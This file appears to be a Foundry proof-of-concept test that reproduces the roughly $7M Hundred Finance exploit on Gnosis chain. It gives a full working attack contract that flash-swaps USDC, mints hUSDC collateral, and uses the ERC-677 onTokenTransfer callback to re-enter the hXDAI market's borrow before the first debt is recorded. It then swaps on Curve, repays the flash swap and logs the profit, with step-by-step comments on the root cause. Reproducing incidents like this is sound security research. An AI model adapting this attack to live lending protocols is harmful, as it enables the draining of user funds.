// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Root cause: ERC667 tokens hooks reentrancy.

// VULNERABILITY: Compound-style cToken `borrowFresh` calls `doTransferOut(underlying.transfer)` BEFORE writing `accountBorrows[borrower]` and `totalBorrows`. No reentrancy guard protects the window between external call and state update. Because USDC on Gnosis is ERC-677, the transfer calls `recipient.onTokenTransfer(...)` synchronously. The attack contract uses this hook to re-enter a *different* cToken market's `borrow()` while the first borrow's debt is invisible to the Comptroller's liquidity calculation. Cross-market reentrancy succeeds because each market's `nonReentrant` only guards its own contract.
*/
 /* Original header lines follow inside comment:
// VULNERABILITY: Cross-market reentrancy via ERC-677 token transfer callback in cToken borrow before state update
// Detailed explanation with code references:
// - In Compound-style CToken (see sources/CEther_090a00/CEther.sol:1956 for borrowInternal, :1978 for borrowFresh, shared logic for CErc20Delegator impls):
//   borrow() calls borrowInternal() (protected by nonReentrant at :2671) which does accrueInterest then borrowFresh().
// - borrowFresh (CEther.sol:1978):
//     1. comptroller.borrowAllowed(this, borrower, amount) -- liquidity calc from Comptroller using *stored* accountBorrows/totalBorrows across markets (see calls at :1980)
//     2. freshness/cash checks
//     3. compute vars.accountBorrowsNew, vars.totalBorrowsNew
//     4. doTransferOut(borrower, borrowAmount)  <--- INTERACTION before EFFECTS  (CEther.sol:2030)
//        For CErc20: underlying.transfer(to, amount)  [see CErc20Delegator borrow proxy at sources/CErc20Delegator_243E33/CErc20Delegator.sol:604 and note]
//     5. THEN state write: accountBorrows[borrower] = ... ; totalBorrows = ... (CEther.sol:2033-2035)
// - Because USDC (0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83) on Gnosis implements ERC-677 (transfer triggers onTokenTransfer), the receiver (attacker) receives synchronous callback.
// - nonReentrant is *per-cToken* (separate _notEntered state per contract instance: husd vs hxdai), so reentering hXDAI.borrow() from inside hUSDC's transfer is allowed.
// - Comptroller's borrowAllowed for second market sees mint collateral but not yet the first market's debt (state not committed).
// - Reference: original Compound issue https://github.com/compound-finance/compound-protocol/issues/141
// Why it works: violation of Checks-Effects-Interactions + no cross-market reentrancy guard + ERC20 transfer as a reentrancy vector when receiver is attacker-controlled contract.
// Impact: Attacker borrows from second market without repaying collateral coverage; drains protocol liquidity (in this case ~$7M+ across markets) by double-spending the same collateral position within one tx.

Attacker wallet: 0xd041ad9aae5cf96b21c3ffcb303a0cb80779e358
Attacker contract: 0xdbf225e3d626ec31f502d435b0f72d82b08e1bdd
Attack tx: https://gnosisscan.io/tx/0x534b84f657883ddc1b66a314e8b392feb35024afdec61dfe8e7c510cfac1a098
Debug tx: https://dashboard.tenderly.co/tx/xdai/0x534b84f657883ddc1b66a314e8b392feb35024afdec61dfe8e7c510cfac1a098

 Vulnerable contract:
 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee
 0xe4e43864ea18d5e5211352a4b810383460ab7fcc
 0x8e15a22853a0a60a0fbb0d875055a8e66cff0235
 0x090a00a2de0ea83def700b5e216f87a5d4f394fe

ref: https://github.com/compound-finance/compound-protocol/issues/141
credit: https://github.com/Hephyrius/Immuni-Hundred-POC*/
interface ICompoundToken {
    function borrow(
        uint256 borrowAmount
    ) external;
    function repayBorrow(
        uint256 repayAmount
    ) external;
    function redeem(
        uint256 redeemAmount
    ) external;
    function mint(
        uint256 amount
    ) external;
    function comptroller() external view returns (address);
}

interface IComptroller {
    function allMarkets() external view returns (address[] memory);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}

interface IWeth {
    function deposit() external payable;
}

contract ContractTest is Test {
    IERC20 private constant usdc = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
    IERC20 private constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

    address private constant husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee;
    address private constant hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE;

    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Router private constant router = IUniswapV2Router(payable(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506));

    uint256 totalBorrowed;
    bool xdaiBorrowed = false;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8553", 21_120_319); //fork gnosis at block number 21120319
    }

    function testExploit() public {
        // EXPLOIT STEPS:
        // 1. Flash-swap nearly all USDC liquidity from the wxDAI/USDC Sushi pair (triggers uniswapV2Call).
        // 2. depositUsdc(): approve + mint() into hUSDC (husd) → receive hUSDC collateral tokens. Collateral now registered in Comptroller.
        // 3. borrowUsdc(): call hUSDC.borrow(90% of flash). Inside borrowFresh: borrowAllowed passes (collateral present), doTransferOut sends USDC → ERC-677 hook fires onTokenTransfer *before* accountBorrows/totalBorrows are updated.
        // 4. onTokenTransfer (from non-flash sender) sees xdaiBorrowed==false → calls borrowXdai() on the hXDAI (CEther) market. Comptroller still sees the hUSDC collateral as unencumbered → allows large native XDAI borrow.
        // 5. Wrap received XDAI, swap on Curve to USDC to repay flash + profit.
        // 6. Repay flash swap. Debt on hUSDC is finally recorded after the reentrant borrow returns.
        borrow();
        console.log("Attacker Profit: %s usdc", usdc.balanceOf(address(this)) / 1e6);
    }

    function borrow() internal {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(wxdai), address(usdc)));
        uint256 borrowAmount = usdc.balanceOf(address(pair)) - 1;

        pair.swap(
            pair.token0() == address(wxdai) ? 0 : borrowAmount,
            pair.token0() == address(wxdai) ? borrowAmount : 0,
            address(this),
            abi.encode("0x")
        );
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        attackLogic(_amount0, _amount1, _data);
    }

    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;
        console.log("Borrowed: %s USDC from Sushi", usdc.balanceOf(address(this)) / 1e6);
        depositUsdc();
        borrowUsdc();
        swapXdai();
        uint256 amountRepay = ((amountToken * 1000) / 997) + 1;
        usdc.transfer(msg.sender, amountRepay);
        console.log("Repay Flashloan for : %s USDC", amountRepay / 1e6);
    }

    function depositUsdc() internal {
        uint256 balance = usdc.balanceOf(address(this));
        usdc.approve(husd, balance);
        // EXPLOIT STEPS (prep): Minting hUSDC collateral is the prerequisite. This collateral will be used (under stale view) for the reentrant borrow on the second market.
        ICompoundToken(husd).mint(balance);
    }

    function borrowUsdc() internal {
        uint256 amount = (totalBorrowed * 90) / 100;
        // VULNERABILITY POINT: The hUSDC.borrow call will perform underlying USDC.transfer (via doTransferOut) and then invoke onTokenTransfer on this contract BEFORE the borrow state is written back in the cToken.
        ICompoundToken(husd).borrow(amount);
        console.log("Attacker USDC Balance After Borrow: %s USDC", usdc.balanceOf(address(this)) / 1e6);
        console.log("Hundred USDC Balance After Borrow: %s USDC", usdc.balanceOf(husd) / 1e6);
    }

    function borrowXdai() internal {
        xdaiBorrowed = true;
        uint256 amount = ((totalBorrowed * 1e12) * 60) / 100;

        // EXPLOIT STEPS (cont.): This borrow succeeds only because of the reentrancy window. Comptroller liquidity uses stale (pre-borrow) state from hUSDC.
        ICompoundToken(hxdai).borrow(amount);
        console.log("Attacker xdai Balance After Borrow: %s XDAI", address(this).balance / 1e8);
        console.log("Hundred xdai Balance After Borrow: %s Xdai", address(hxdai).balance / 1e8);
    }

    function swapXdai() internal {
        IWeth(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
    }

    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        address pair = factory.getPair(address(wxdai), address(usdc));

        if (_from != pair && xdaiBorrowed == false) {
            console.log("''i'm in!''");
            // EXPLOIT STEPS (reentrancy via ERC-677 hook): During the transfer-out of the *first* borrow, this hook is invoked by the token itself.
            // At this moment the first borrow's effects on accountBorrows/totalBorrows have not been applied.
            // We immediately borrow against the other market (hXDAI) whose collateral check passes because the debt side-effect is invisible.
            borrowXdai();
        }
    }

    receive() external payable {}
}
